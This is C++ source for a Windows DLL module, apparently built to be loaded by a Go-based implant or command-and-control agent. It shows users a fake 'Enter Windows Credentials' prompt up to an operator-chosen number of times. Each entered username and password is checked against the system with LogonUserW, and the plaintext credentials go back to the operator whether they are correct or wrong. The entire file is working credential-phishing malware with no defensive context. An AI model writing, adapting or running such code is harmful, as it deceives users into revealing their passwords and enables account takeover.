#include "pch.h"

#include <wincred.h>
#include <cstdint>
#include <stdlib.h>

#include "output.h"

#pragma comment(lib, "Credui.lib")


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void askForCreds(DWORD maxTries);
char* w2a(WCHAR* orig);

int counter = 0;
Output* output;

extern "C" {
	__declspec(dllexport) int __cdecl Execute(char* argsBuffer, uint32_t bufferSize, goCallback callback);
}
int Execute(char* argsBuffer, uint32_t bufferSize, goCallback callback)
{
	output = NewOutput(128, callback);

	if (bufferSize < 1) {
		append(output, "You must provide an argument\n");
		return failure(output);
	}

	errno = 0;
	DWORD maxTries = strtol(argsBuffer, NULL, 10);
	if (errno != 0 || maxTries < 1) {
		append(output, "You must provide a positive integer as argument\n");
		return failure(output);
	}

	append(output, "Asking for credentials at most %d times\n", maxTries);
	askForCreds(maxTries);
	append(output, "Done, total password prompt counter: %d\n", counter);

	return success(output);
}

void askForCreds(DWORD maxTries) {

	BOOL loginStatus = FALSE;
	DWORD numTries = 0;

	while ((loginStatus == FALSE) && (numTries < maxTries)) {
		numTries += 1;

		CREDUI_INFOW uiInfo = {};
		uiInfo.cbSize = sizeof(uiInfo);
		uiInfo.hwndParent = nullptr;
		uiInfo.pszCaptionText = L"Enter Windows Credentials";
		uiInfo.pszMessageText = L"Enter your credentials to proceed:"; // optional
		uiInfo.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID authBuffer = nullptr;
		ULONG ulAuthBufferSize = 0;
		BOOL fSave = false;
		DWORD dwAuthError = 0;
		dwAuthError = CredUIPromptForWindowsCredentialsW(
			&uiInfo,
			0,
			&authPackage,
			nullptr,
			0,
			&authBuffer,
			&ulAuthBufferSize,
			&fSave,
			CREDUIWIN_ENUMERATE_CURRENT_USER
		);

		if (dwAuthError == ERROR_SUCCESS) {
			WCHAR pszUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxUserName = CREDUI_MAX_USERNAME_LENGTH + 1;
			WCHAR pszDomainName[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxDomainName = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			WCHAR pszPassword[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			CredUnPackAuthenticationBufferW(
				CRED_PACK_PROTECTED_CREDENTIALS,
				authBuffer,
				ulAuthBufferSize,
				pszUserName,
				&dwMaxUserName,
				pszDomainName,
				&dwMaxDomainName,
				pszPassword,
				&dwMaxPassword
			);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(
				pszUserName,
				parsedUserName,
				CREDUI_MAX_USERNAME_LENGTH + 1,
				parsedDomain,
				CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1
			);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(
				parsedUserName,
				parsedDomain,
				pszPassword,
				LOGON32_LOGON_NETWORK,
				LOGON32_PROVIDER_DEFAULT,
				&handle
			);

			counter += 1;
			if (loginStatus == TRUE) {
				CloseHandle(handle);
				append(output, "Correct credentials: %s:%s\n", w2a(pszUserName), w2a(pszPassword));
				break;
			}
			else {
				append(output, "Wrong credentials: %s:%s\n", w2a(pszUserName), w2a(pszPassword));
			}
		}
	}
}

char* w2a(WCHAR* wstr)
{
	const size_t n = (wcslen(wstr) + 1) * 2;
	char* astr = new char[n];

	size_t dummy = 0;
	wcstombs_s(&dummy, astr, n, wstr, _TRUNCATE);

	return astr;
}